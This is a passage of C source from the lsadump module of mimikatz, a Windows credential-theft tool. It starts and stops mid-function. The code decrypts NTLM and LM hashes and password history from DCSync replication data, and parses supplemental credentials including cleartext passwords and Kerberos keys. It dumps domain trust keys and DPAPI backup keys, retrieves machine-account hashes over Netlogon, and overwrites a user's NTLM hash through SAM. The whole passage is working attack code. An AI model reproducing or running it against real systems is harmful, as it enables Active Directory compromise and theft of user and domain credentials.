			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
			kprintf(L"\n");
		}
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
	}
	return status;
}

void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0;
	PVOID samAccountName;
	PBYTE unicodePwd;
	DWORD unicodePwdSize;
	PVOID sid;
	BYTE clearHash[LM_NTLM_HASH_LENGTH];

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, &samAccountName, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
	{
		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
		kprintf(L"\t");
		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_unicodePwd, FALSE);
		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
		{
			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
		}
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
		kprintf(L"\n");
	}
}

void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
{
	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
	kprintf(L"\n");
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrSecret(prefixTable, attributes, someExport);
}

const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
};

LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
{
	LPCWSTR target;
	switch(accountType)
	{
	case SAM_DOMAIN_OBJECT:
		target = L"DOMAIN_OBJECT";
		break;
	case SAM_GROUP_OBJECT:
		target = L"GROUP_OBJECT";
		break;
	case SAM_NON_SECURITY_GROUP_OBJECT:
		target = L"NON_SECURITY_GROUP_OBJECT";
		break;
	case SAM_ALIAS_OBJECT:
		target = L"ALIAS_OBJECT";
		break;
	case SAM_NON_SECURITY_ALIAS_OBJECT:
		target = L"NON_SECURITY_ALIAS_OBJECT";
		break;
	case SAM_USER_OBJECT:
		target = L"USER_OBJECT";
		break;
	case SAM_MACHINE_ACCOUNT:
		target = L"MACHINE_ACCOUNT";
		break;
	case SAM_TRUST_ACCOUNT:
		target = L"TRUST_ACCOUNT";
		break;
	case SAM_APP_BASIC_GROUP:
		target = L"APP_BASIC_GROUP";
		break;
	case SAM_APP_QUERY_GROUP:
		target = L"APP_QUERY_GROUP";
		break;
	default:
		target = L"unknown";
	}
	return target;
}

void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0, i;
	PBYTE encodedData;
	DWORD encodedDataSize;
	PVOID data;
	ATTRVALBLOCK *sids;
	
	kprintf(L"** SAM ACCOUNT **\n\n");
	kull_m_rpc_drsr_findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
	kull_m_rpc_drsr_findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
		kprintf(L"Account Type         : %08x ( %s )\n", *(PDWORD) data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD) data));

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
	{
		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
		for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
			if((1 << i) & *(PDWORD) data)
				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
		kprintf(L")\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
	{
		kprintf(L"Account expiration   : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
	{
		kprintf(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}
	
	if(sids = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
	{
		kprintf(L"SID history:\n");
		for(i = 0; i < sids->valCount; i++)
		{
			kprintf(L"  ");
			kull_m_string_displaySID(sids->pAVal[i].pVal);
			kprintf(L"\n");
		}
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
	{
		kprintf(L"Object Security ID   : ");
		kull_m_string_displaySID(data);
		kprintf(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		kprintf(L"Object Relative ID   : %u\n", rid);

		kprintf(L"\nCredentials:\n");
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
	{
		kprintf(L"\nSupplemental Credentials:\n");
		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
	}
}

DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
{
	DWORD i, j, k, szData;
	PUSER_PROPERTY property;
	PBYTE data;
	UNICODE_STRING Name;
	LPSTR value;

	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;

	if(properties->Length > (FIELD_OFFSET(USER_PROPERTIES, PropertyCount) - FIELD_OFFSET(USER_PROPERTIES, Reserved4)))
	{
		if((properties->PropertySignature == L'P') && properties->PropertyCount)
		{
			for(i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
			{
				Name.Length = Name.MaximumLength = property->NameLength;
				Name.Buffer = property->PropertyName;

				value = (LPSTR) ((LPCBYTE) property->PropertyName + property->NameLength);
				szData = property->ValueLength / 2;

				kprintf(L"* %wZ *\n", &Name);
				if(data = (PBYTE) LocalAlloc(LPTR, szData))
				{
					for(j = 0; j < szData; j++)
					{
						sscanf_s(&value[j*2], "%02x", &k);
						data[j] = (BYTE) k;
					}

					if(RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
					{
						kprintf(L"    %.*s\n", szData / sizeof(wchar_t), (PWSTR) data);
					}
					else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
					{
						pWDigest = (PWDIGEST_CREDENTIALS) data;
						for(j = 0; j < pWDigest->NumberOfHashes; j++)
						{
							kprintf(L"    %02u  ", j + 1);
							kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
							kprintf(L"\n");
						}
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
					{
						pKerb = (PKERB_STORED_CREDENTIAL) data;
						kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerb + pKerb->DefaultSaltOffset));
						pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
						pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
						kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
					{
						pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) data;
						kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset), pKerbNew->DefaultIterationCount);
						pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
						kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
					{
						kprintf(L"    Random Value : ");
						kull_m_string_wprintf_hex(data, szData, 0);
						kprintf(L"\n");
					}
					else
					{
						kprintf(L"    Unknown data : ");
						kull_m_string_wprintf_hex(data, szData, 1);
						kprintf(L"\n");
					}
					kprintf(L"\n");
					LocalFree(data);
				}
			}
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrust(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	UNICODE_STRING uPartner, uDomain, uUpcasePartner, uUpcaseDomain;
	
	kprintf(L"** TRUSTED DOMAIN - Antisocial **\n\n");
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, &encodedData, &encodedDataSize))
	{
		uPartner.Length = uPartner.MaximumLength = (USHORT) encodedDataSize;
		uPartner.Buffer = (PWSTR) encodedData;
		kprintf(L"Partner              : %wZ\n", &uPartner);
		if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcasePartner, &uPartner, TRUE)))
		{
			RtlInitUnicodeString(&uDomain, szSrcDomain);
			if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcaseDomain, &uDomain, TRUE)))
			{
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, TRUE);
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, FALSE);
				RtlFreeUnicodeString(&uUpcaseDomain);
			}
			RtlFreeUnicodeString(&uUpcasePartner);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrustAuthentication(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, PCUNICODE_STRING domain, PCUNICODE_STRING partner, BOOL isIn)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	PNTDS_LSA_AUTH_INFORMATIONS authInfos;
	LPCWSTR prefix, prefixOld;
	PCUNICODE_STRING from, dest;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, isIn ? szOID_ANSI_trustAuthIncoming : szOID_ANSI_trustAuthOutgoing, &encodedData, &encodedDataSize))
	{
		if(isIn)
		{
			prefix = L"  In ";
			prefixOld = L" In-1";
			from = domain;
			dest = partner;
		}
		else
		{
			prefix = L" Out ";
			prefixOld = L"Out-1";
			from = partner;
			dest = domain;
		}
		authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) encodedData;
		if(authInfos->count)
		{
			if(authInfos->offsetToAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
			if(authInfos->offsetToPreviousAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrSecret(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL someExport)
{
	PVOID data;
	PWSTR name, ptr;
	DWORD size;
	USHORT szGuid;
	GUID guid;
	UNICODE_STRING uGuid;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_name, &data, &size))
	{
		if(name = (PWSTR) LocalAlloc(LPTR, size + sizeof(wchar_t)))
		{
			RtlCopyMemory(name, data, size);
			if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, &data, &size))
			{
				if(name == wcsstr(name, L"BCKUPKEY_"))
				{
					if(((_wcsicmp(name, L"BCKUPKEY_P Secret") == 0) || (_wcsicmp(name, L"BCKUPKEY_PREFERRED Secret") == 0)) && (size = sizeof(GUID)))
					{
						kprintf(L"Link to key with GUID: ");
						kull_m_string_displayGUID((LPCGUID) data);
						kprintf(L" (not an object GUID)\n");
					}
					else if(ptr = wcschr(name + 9, L' '))
					{
						szGuid = (USHORT) ((ptr - (name + 9)) * sizeof(wchar_t));
						uGuid.Length = uGuid.MaximumLength = szGuid + (2 * sizeof(wchar_t));
						if(uGuid.Buffer = (PWSTR) LocalAlloc(LPTR, uGuid.MaximumLength))
						{
							uGuid.Buffer[0] = L'{';
							RtlCopyMemory(uGuid.Buffer + 1, name + 9, szGuid);
							uGuid.Buffer[(uGuid.Length >> 1) - 1] = L'}';
							if(NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid)))
								kuhl_m_lsadump_analyzeKey(&guid, (PKIWI_BACKUP_KEY) data, size, someExport);
							LocalFree(uGuid.Buffer);
						}
					}
				}
				else kull_m_string_wprintf_hex(data, size, 1 | (16 << 16));
			}
			LocalFree(name);
		}
	}
}

NETLOGON_SECURE_CHANNEL_TYPE kuhl_m_lsadump_netsync_sc[] = {WorkstationSecureChannel, ServerSecureChannel, TrustedDnsDomainSecureChannel, CdcServerSecureChannel};
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
	NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
	DWORD i = 0, NegotiateFlags = 0x600FFFFF;
	MD5_CTX ctx;
	ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
	NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
	PCWCHAR szDc, szComputer, szUser, szNtlm, szAccount;

	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
			{
				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
				{
					//kprintf(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); kprintf(L"\n");
					status = I_NetServerReqChallenge((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
					if(NT_SUCCESS(status))
					{
						//kprintf(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); kprintf(L"\n");
						MD5Init(&ctx);
						MD5Update(&ctx, &i, sizeof(i));
						MD5Update(&ctx, ClientChallenge.data, sizeof(ClientChallenge.data));
						MD5Update(&ctx, ServerChallenge.data, sizeof(ServerChallenge.data));
						MD5Final(&ctx);
						if(kull_m_crypto_hmac(CALG_MD5, ntlmHash, sizeof(ntlmHash), ctx.digest, sizeof(ctx.digest), sessionKey, sizeof(sessionKey)))
						{
							//kprintf(L"> Session Key              : "); kull_m_string_wprintf_hex(sessionKey, sizeof(sessionKey), 0); kprintf(L"\n");
							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ClientChallenge.data, (PBYTE) ClientCredential.data, sessionKey);
							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ServerChallenge.data, (PBYTE) CandidateServerCredential.data, sessionKey);
							//kprintf(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
							status = I_NetServerAuthenticate2((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
							if(NT_SUCCESS(status))
							{
								//kprintf(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); kprintf(L"\n");
								if(RtlEqualMemory(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
								{
									//kprintf(L"< NegotiateFlags           : 0x%08x\n", NegotiateFlags);
									for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < ARRAYSIZE(kuhl_m_lsadump_netsync_sc)); i++)
									{
										kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
										status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
										if(NT_SUCCESS(status))
										{
											kprintf(L"  Account: %s\n", szAccount);
											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
											kprintf(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
											kprintf(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
										}
										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
									}
									if(!NT_SUCCESS(status))
										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
								}
								else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
							}
							else PRINT_ERROR(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
						}
					}
					else PRINT_ERROR(L"I_NetServerReqChallenge (0x%08x)\n", status);
				}
				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
			}
			else PRINT_ERROR(L"Missing argument : ntlm\n");
		}
		else PRINT_ERROR(L"Missing argument : user\n");
	}
	else PRINT_ERROR(L"Missing argument : dc\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_netsync_NlComputeCredentials(PBYTE input, PBYTE output, PBYTE key) // Q&D
{
  BYTE bufferData[DES_BLOCK_LENGTH];
  RtlZeroMemory(output, DES_BLOCK_LENGTH);
  RtlEncryptDES1block1key(input, key, bufferData);
  return RtlEncryptDES1block1key(bufferData, key + DES_KEY_LENGTH, output);
}

void kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(PNETLOGON_CREDENTIAL Credential, DWORD TimeStamp, PNETLOGON_AUTHENTICATOR Authenticator, BYTE sessionKey[MD5_DIGEST_LENGTH])
{
	Authenticator->Timestamp = TimeStamp;
	*(PDWORD64) (Credential->data) += TimeStamp;
	kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) Credential->data, (PBYTE) Authenticator->Credential.data, sessionKey);
}

/*	This function `setntlm` is based on the idea of
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	yes, again him... he loves LSA too ;)
*/
DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
{
	NTSTATUS status, enumDomainStatus;
	LSA_UNICODE_STRING serverName, userName, password;
	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid = NULL, *pUse = NULL;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
	PSID domainSid;
	PCWCHAR szUser, szServer = NULL, szPassword;
	SAMPR_USER_INFO_BUFFER infos = {{{0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, {0x7c, 0x1c, 0x15, 0xe8, 0x74, 0x11, 0xfb, 0xa2, 0x1d, 0x91, 0xa0, 0x81, 0xd4, 0xb3, 0x78, 0x61}, TRUE, FALSE, FALSE, FALSE,}};

	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		RtlInitUnicodeString(&userName, szUser);
		kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
		RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
		kprintf(L"Target server: %wZ\n", &serverName);
		kprintf(L"Target user  : %wZ\n", &userName);
		if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
		{
			RtlInitUnicodeString(&password, szPassword);
			status = RtlDigestNTLM(&password, infos.Internal1.NTHash);
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
		}
		else if(kull_m_string_args_byName(argc, argv, L"ntlm", &szPassword, NULL))
		{
			status = kull_m_string_stringToHex(szPassword, infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"Unable to convert \'%s\' to NTLM hash (16 bytes)\n", szPassword);
		}
		else
		{
			kprintf(L"** No credentials provided, will use the default one **\n");
			infos.Internal1.LmPasswordPresent = TRUE;
			status = STATUS_SUCCESS;
		}

		if(NT_SUCCESS(status))
		{
			kprintf(L"NTLM         : ");
			kull_m_string_wprintf_hex(infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash), 0);
			kprintf(L"\n\n");
			status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
			if(NT_SUCCESS(status))
			{
				do
				{
					enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
					if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
					{
						for(i = 0; i < domainCountRetourned; i++)
						{
							if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
								continue;
							kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
							status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
							if(NT_SUCCESS(status))
							{
								kprintf(L"Domain SID   : ");
								kull_m_string_displaySID(domainSid);
								kprintf(L"\n");
								status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
								if(NT_SUCCESS(status))
								{
									status = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
									if(NT_SUCCESS(status))
									{
										kprintf(L"User RID     : %u\n", pRid[0]);
										status = SamOpenUser(hDomainHandle, USER_FORCE_PASSWORD_CHANGE, pRid[0], &hUserHandle);
										if(NT_SUCCESS(status))
										{
											status = SamSetInformationUser(hUserHandle, UserInternal1Information, &infos);
											if(NT_SUCCESS(status))
												kprintf(L"\n>> Informations are in the target SAM!\n");
											else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
											SamCloseHandle(hUserHandle);
										}
										else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
										SamFreeMemory(pRid);
										SamFreeMemory(pUse);
									}
									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
									SamCloseHandle(hDomainHandle);
								}
								else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
								SamFreeMemory(domainSid);
							}
							else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status);
						}
						SamFreeMemory(pEnumDomainBuffer);
					}
					else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
				}
				while(enumDomainStatus == STATUS_MORE_ENTRIES);
				SamCloseHandle(hServerHandle);
			}
			else PRINT_ERROR(L"SamConnect: %08x\n", status);
		}
	}
	else PRINT_ERROR(L"Argument /user: is needed\n");
	return STATUS_SUCCESS;
}

/*	This function `changentlm` is based on another crazy idea of
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
*/
NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
{
	NTSTATUS status0 = STATUS_DATA_ERROR, status1 = STATUS_DATA_ERROR;
